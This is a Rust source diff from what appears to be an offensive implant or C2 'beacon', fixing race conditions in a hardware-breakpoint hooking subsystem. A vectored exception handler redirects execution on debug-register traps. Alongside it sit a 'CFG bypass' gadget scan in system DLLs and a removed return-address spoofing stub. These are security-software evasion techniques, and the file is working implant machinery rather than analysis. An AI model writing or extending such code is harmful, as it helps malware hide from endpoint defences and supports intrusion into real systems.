@@ -106,7 +106,7 @@ const CTX_RIP: usize = 0x0F8;
 // Slot state values used by the atomic protocol:
 const SLOT_VACANT: u8 = 0; // free, available for add_hwbp to claim
 const SLOT_OCCUPIED: u8 = 1; // armed; VEH may act on it
-const SLOT_CLAIMED: u8 = 2; // add_hwbp/remove_hwbp is mid-update; VEH skips
+const SLOT_CLAIMED: u8 = 2; // add_hwbp/remove_hwbp is mid-update; VEH clears DR6 + RF
 
 #[allow(dead_code)]
 #[derive(Debug, Clone, Copy)]
@@ -153,10 +153,13 @@ static HWBP_POOL: [SyncUnsafeCell<HwbpEntry>; 4] = [
     SyncUnsafeCell::new(HWBP_ENTRY_ZERO),
 ];
 
-/// Per-slot state: SLOT_VACANT / SLOT_CLAIMED / SLOT_OCCUPIED. The VEH only
-/// acts on OCCUPIED; `add_hwbp` claims via CAS(VACANT→CLAIMED), publishes via
+/// Per-slot state: SLOT_VACANT / SLOT_CLAIMED / SLOT_OCCUPIED. The VEH
+/// redirects only on OCCUPIED; a #DB whose B-bit maps to a CLAIMED slot is
+/// still ours (the DR register is armed throughout the update window) and is
+/// handled with a DR6 clear + Resume Flag; a VACANT slot's B-bit is foreign.
+/// `add_hwbp` claims via CAS(VACANT→CLAIMED), publishes via
 /// store(CLAIMED→OCCUPIED, Release); `remove_hwbp` claims via
-/// CAS(OCCUPIED→CLAIMED) then store(→VACANT, Release).
+/// CAS(OCCUPIED→CLAIMED), disarms the DR register, then stores →VACANT.
 static HWBP_SLOT_STATE: [core::sync::atomic::AtomicU8; 4] = [
     core::sync::atomic::AtomicU8::new(SLOT_VACANT),
     core::sync::atomic::AtomicU8::new(SLOT_VACANT),
@@ -192,10 +195,12 @@ pub(crate) static VEH_SAFE: core::sync::atomic::AtomicBool =
     core::sync::atomic::AtomicBool::new(true);
 
 /// Initialize CFG bypass subsystem. Called during bootstrap.
-/// Scans for proxy gadgets and return-address stubs in system DLLs.
-/// The gadgets are available for future sync-exception proxy flows
-/// (Micro-Stager). For async HWBP exceptions, CFG marking + direct
-/// VEH registration is the current path.
+/// Scans for proxy gadgets in system DLLs. The gadgets are available for
+/// future sync-exception proxy flows (Micro-Stager). For async HWBP
+/// exceptions, CFG marking + direct VEH registration is the current path.
+///
+/// (The caller-spoof return-address stub scan was removed together with the
+/// `caller_spoof` spoof machinery — see caller_spoof.rs module docs.)
 ///
 /// # Safety
 /// Must run after PEB-walk bootstrap. Single-threaded beacon context.
@@ -206,13 +211,6 @@ pub unsafe fn init_countermeasures() {
     }
     if crate::proxy_veh::proxy_available() {
         diag(b'G'); // gadget found
-    }
-
-    // Scan for return-address stub (ADD RSP,X; RET or bare RET in ntdll).
-    if let Some(stub) = crate::caller_spoof::scan_return_stub() {
-        diag(b'R'); // stub found
-                    // Store for future use by caller-spoof thunk.
-        let _ = stub;
     }
 }
 
@@ -502,9 +500,11 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
     //
     // No lock. For each B-bit set in DR6 we check whether the corresponding
     // slot is armed (OCCUPIED) and whether its target matches the faulting
-    // address or RIP. If so we redirect and resume. If a slot is mid-update
-    // (CLAIMED) or vacant, we skip it; the CPU will re-trap if the slot is
-    // later armed and the address is hit again.
+    // address or RIP. If so we redirect and resume. A #DB whose B-bit maps to
+    // a slot being armed/disarmed (CLAIMED) is still ours (the DR register is
+    // armed throughout the update window) and is handled by clearing DR6 +
+    // setting RF — see the CLAIMED branch below. Only a VACANT slot (foreign
+    // breakpoint or a stale B-bit) is genuinely not ours.
     //
     // A #DB whose B-bit points at a slot we have nothing to say about is
     // genuinely foreign (e.g. a debugger's HWBP, or a stale B-bit). Returning
@@ -515,9 +515,49 @@ pub unsafe extern "system" fn hwbp_veh_handler(ep: usize) -> i32 {
             continue;
         }
         let state = HWBP_SLOT_STATE[i as usize].load(core::sync::atomic::Ordering::Acquire);
+        if state == SLOT_CLAIMED {
+            // ---- #DB on a slot mid-arm / mid-disarm (CRITICAL-7 sequel) ----
+            // The DR register for this slot IS armed (add_hwbp arms the
+            // register BEFORE it publishes OCCUPIED; remove_hwbp disarms only
+            // AFTER it claims the slot), so this #DB is genuinely OURS — the
+            // target address was executed inside the arming/disarming window.
+            // We must NOT return EXCEPTION_CONTINUE_SEARCH: no other handler
+            // knows this breakpoint, so the exception would go unhandled and
+            // terminate the process. Handle it as a benign one-shot: clear DR6
+            // (stale bits misidentify the next trap) and set the Resume Flag
+            // so the CPU skips the breakpoint for exactly one instruction.
+            // During arming the next execution re-traps and, by then, the
+            // slot is OCCUPIED and the VEH redirects; during disarming the
+            // register is cleared before VACANT is published, so traps stop.
+            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                vehtag(b'C');
+            } // claimed-slot #DB handled
+            // Clear DR6 — Windows doesn't auto-clear it.
+            // SAFETY: ctx is a valid CONTEXT; DR6 is at offset 0x068.
+            core::ptr::write_unaligned(ctx.add(CTX_DR6) as *mut u64, 0);
+            // Set Resume Flag (EFLAGS bit 16) — skip the HWBP trigger for
+            // exactly one instruction.
+            // SAFETY: ctx is a valid CONTEXT; EFlags is at offset 0x044.
+            let eflags = core::ptr::read_unaligned(ctx.add(CTX_EFLAGS) as *const u32);
+            core::ptr::write_unaligned(ctx.add(CTX_EFLAGS) as *mut u32, eflags | RF_BIT);
+            // CONTEXT_DEBUG_REGISTERS to apply the DR6 clear + CONTEXT_CONTROL
+            // to apply EFlags.
+            // SAFETY: ctx is a valid CONTEXT; ContextFlags is at offset 0x030.
+            let flags = core::ptr::read_unaligned(ctx.add(CTX_CONTEXT_FLAGS) as *const u32);
+            core::ptr::write_unaligned(
+                ctx.add(CTX_CONTEXT_FLAGS) as *mut u32,
+                flags | CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL,
+            );
+            if DIAG_ENABLED.load(core::sync::atomic::Ordering::Relaxed) {
+                vehtag(b'c');
+            } // resuming
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
         if state != SLOT_OCCUPIED {
-            // Slot not armed (vacant, or an armer/remover is mid-update). Skip;
-            // the OS will re-dispatch a #DB if/when the slot is armed.
+            // VACANT: after the disarm-before-vacant ordering in remove_hwbp,
+            // a vacant slot never has an armed DR register, so a B-bit on a
+            // VACANT slot is foreign (a debugger's HWBP, or a stale DR6 bit).
+            // Returning SEARCH for it is correct — it is not our breakpoint.
             continue;
         }
         // SAFETY: the slot is OBSERVED OCCUPIED (Acquire above), so the
@@ -695,17 +735,21 @@ fn claim_slot() -> Result<usize, &'static str> {
 ///
 /// # Arming protocol (CRITICAL-6/7)
 ///
-/// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH skips CLAIMED slots.
+/// 1. Claim a slot (VACANT→CLAIMED via CAS). The VEH handles a #DB on a
+///    CLAIMED slot with a DR6 clear + Resume Flag (it is ours — the register
+///    gets armed below — and must not be passed through unhandled).
 /// 2. Resolve the shadow addr; bail (releasing the slot) if invalid.
 /// 3. Register the VEH if not already registered (once, before any DR write).
 /// 4. Arm the DR register via NtSetContextThread.
 /// 5. Write the entry into the pool cell, then publish CLAIMED→OCCUPIED with
-///    Release ordering. Only AFTER this point can the VEH act on the slot.
+///    Release ordering. Only AFTER this point can the VEH redirect on the slot.
 ///
-/// The DR bit is set BEFORE the slot is published. If a #DB somehow fired
-/// between arming and publishing, the VEH would see CLAIMED and skip (the CPU
-/// re-traps on the next execution, by which time we've published). We never
-/// publish a slot whose DR bit isn't already set, so the VEH never observes an
+/// The DR bit is set BEFORE the slot is published. If a #DB fires between
+/// arming and publishing, the VEH sees CLAIMED and handles it as a benign
+/// one-shot (clear DR6 + set RF, no redirect): the target instruction executes
+/// once, and the next execution re-traps — by then the slot is OCCUPIED and
+/// the VEH redirects. We never publish a slot whose DR bit isn't already set,
+/// so the VEH never observes an armed-but-unpublished slot as vacant.
 // ── add_hwbp helpers ───────────────────────────────────────────────────────
 
 /// Resolve NtGetContextThread and NtSetContextThread.
@@ -920,22 +964,34 @@ pub unsafe fn add_hwbp(target_addr: usize, shadow_type: ShadowType) -> Result<us
 
 /// Remove a hardware breakpoint and restore the original DR7.
 ///
-/// # Disarming protocol (CRITICAL-6/7)
+/// # Disarming protocol (CRITICAL-6/7 + disarm-before-vacant ordering)
 ///
-/// 1. Atomically claim the slot OCCUPIED→CLAIMED via CAS. The VEH now skips
-///    this slot (it only acts on OCCUPIED), so any in-flight #DB for it is
-///    correctly passed through as "not ours".
-/// 2. Decrement the live count.
-/// 3. Publish VACANT (Release) so a future add_hwbp can reclaim the slot.
-/// 4. Disarm the DR register via NtSetContextThread (clear L/RW/LEN + DRx).
-///    Once disarmed, no new #DB can fire from this slot on this thread.
+/// 1. Atomically claim the slot OCCUPIED→CLAIMED via CAS. The VEH treats a
+///    CLAIMED slot's #DB as ours and handles it with a DR6 clear + Resume
+///    Flag (no redirect — see `hwbp_veh_handler`), so a trap landing in the
+///    disarm window is never passed through unhandled.
+/// 2. Read out the saved entry (documents cell ownership).
+/// 3. **Disarm the DR register** via NtSetContextThread (clear DRx, DR6, and
+///    this slot's L/G/RW/LEN bits in DR7). Only a fully-disarmed slot is
+///    published VACANT — a vacant slot must never carry an armed DR register:
+///    the old VACANT-before-disarm order left a window where a #DB could fire
+///    for a slot the VEH treats as vacant (SEARCH → unhandled → process
+///    death), and a concurrent add_hwbp could reclaim the slot and have its
+///    fresh arming clobbered by the still-pending disarm. If any step of the
+///    disarm fails, the slot is restored to OCCUPIED (the breakpoint is still
+///    armed and the VEH keeps redirecting) and an error is returned — the
+///    caller knows nothing was removed.
+/// 4. Decrement the live count and publish VACANT (Release) so a future
+///    add_hwbp can reclaim the slot. From here on no new #DB can fire from
+///    this slot on this thread.
 /// 5. If the live count reached zero, remove the VEH handler.
 ///
 /// Because the beacon thread is the sole faulting thread for local-enable
 /// HWBPs, and `remove_hwbp` runs on the beacon thread, there is no window
 /// where this thread is both executing the target address and inside
-/// `remove_hwbp`. The CAS+VACANT sequence makes the teardown safe even if
-/// that assumption is ever violated by a global-enable (G bit) breakpoint.
+/// `remove_hwbp`. The CAS + disarm-first sequence makes the teardown safe
+/// even if that assumption is ever violated by a global-enable (G bit)
+/// breakpoint.
 pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     if slot >= 4 {
         return Err("invalid slot");
@@ -959,16 +1015,23 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     // accessor of this cell.
     let _entry: HwbpEntry = core::ptr::read(HWBP_POOL[slot].get());
 
-    HWBP_COUNT.fetch_sub(1, core::sync::atomic::Ordering::Release);
-
-    // Publish VACANT so the VEH skips this slot from now on and a future
-    // add_hwbp can reclaim it.
-    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
+    // If disarming cannot be completed, the breakpoint is still armed and
+    // functional — keep the slot OCCUPIED (the VEH keeps redirecting) and
+    // report the failure, instead of leaving a VACANT slot with a live DR
+    // register (the disarm-before-vacant invariant).
+    let rollback = |tag: u8, err: &'static str| -> Result<(), &'static str> {
+        HWBP_SLOT_STATE[slot].store(SLOT_OCCUPIED, core::sync::atomic::Ordering::Release);
+        unsafe { diag(tag) };
+        Err(err)
+    };
 
     // Allocate CONTEXT buffer.
-    let va_addr = crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
+    let va_addr = match crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
         .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
-        .ok_or("VirtualAlloc unresolved")?;
+    {
+        Some(a) => a,
+        None => return rollback(b'V', "VirtualAlloc unresolved"),
+    };
     type VAlloc = unsafe extern "system" fn(
         *mut core::ffi::c_void,
         usize,
@@ -978,7 +1041,7 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     let vaf: VAlloc = core::mem::transmute(va_addr);
     let ctx_buf = vaf(core::ptr::null_mut(), 1232, 0x3000, 0x04);
     if ctx_buf.is_null() {
-        return Err("VirtualAlloc for CONTEXT failed");
+        return rollback(b'F', "VirtualAlloc for CONTEXT failed");
     }
     let base = ctx_buf as usize;
     // SAFETY: freshly-allocated 1232-byte RW buffer we own.
@@ -987,17 +1050,28 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
     ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
 
     type FnCtx = unsafe extern "system" fn(usize, usize) -> i32;
-    let ntgct: FnCtx = core::mem::transmute(
-        crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread")
-            .ok_or("NtGetContextThread unresolved")?,
-    );
-    if ntgct(NT_CURRENT_THREAD, base) >= 0 {
-        // Clear the slot-specific DRx register and DR6.
+    let ntgct: FnCtx = match crate::resolve::export_addr(b"ntdll.dll", b"NtGetContextThread") {
+        Some(a) => core::mem::transmute(a),
+        None => {
+            free_ctx_buf(ctx_buf);
+            return rollback(b'G', "NtGetContextThread unresolved");
+        }
+    };
+    let ntsct: FnCtx = match crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread") {
+        Some(a) => core::mem::transmute(a),
+        None => {
+            free_ctx_buf(ctx_buf);
+            return rollback(b'S', "NtSetContextThread unresolved");
+        }
+    };
+
+    // Disarm: clear the slot-specific DRx register + DR6, clear only this
+    // slot's bits in DR7 — restoring the full original_dr7 is unsafe when
+    // other slots are active (it would clobber their L/RW/LEN bits) — and
+    // apply via NtSetContextThread. Only a successful disarm publishes VACANT.
+    let disarmed = if ntgct(NT_CURRENT_THREAD, base) >= 0 {
         ctx_write_u64_at(base, CTX_DR0 + slot * 8, 0);
         ctx_write_u64_at(base, CTX_DR6, 0);
-
-        // Clear only this slot's bits in DR7 — restoring the full original_dr7
-        // is unsafe when other slots are active (it would clobber their L/RW/LEN bits).
         let cur_dr7 = ctx_read_u64_at(base, CTX_DR7);
         let mut dr7 = cur_dr7;
         // Clear L and G for this slot
@@ -1006,14 +1080,25 @@ pub unsafe fn remove_hwbp(slot: usize) -> Result<(), &'static str> {
         dr7 &= !(0xFu64 << (16 + slot * 4));
         ctx_write_u64_at(base, CTX_DR7, dr7);
         ctx_write_u32_at(base, CTX_CONTEXT_FLAGS, CONTEXT_DEBUG_REGISTERS);
-        let ntsct: FnCtx = core::mem::transmute(
-            crate::resolve::export_addr(b"ntdll.dll", b"NtSetContextThread")
-                .ok_or("NtSetContextThread unresolved")?,
-        );
-        let _ = ntsct(NT_CURRENT_THREAD, base);
-    }
+        ntsct(NT_CURRENT_THREAD, base) >= 0
+    } else {
+        false
+    };
 
     free_ctx_buf(ctx_buf);
+
+    if !disarmed {
+        // Could not disarm (get/set failed) — the breakpoint may still be
+        // armed. Restore OCCUPIED so the VEH keeps redirecting; the caller
+        // sees an error and knows the slot is still live.
+        return rollback(b'D', "disarm failed");
+    }
+
+    // Disarmed. Now the slot is safe to hand back: decrement the live count
+    // and publish VACANT so a future add_hwbp can reclaim it and the VEH
+    // treats it as foreign.
+    HWBP_COUNT.fetch_sub(1, core::sync::atomic::Ordering::Release);
+    HWBP_SLOT_STATE[slot].store(SLOT_VACANT, core::sync::atomic::Ordering::Release);
 
     // Remove VEH when no more breakpoints are active. Load the count with
     // Acquire (paired with the fetch_sub Release above); if zero, swap the
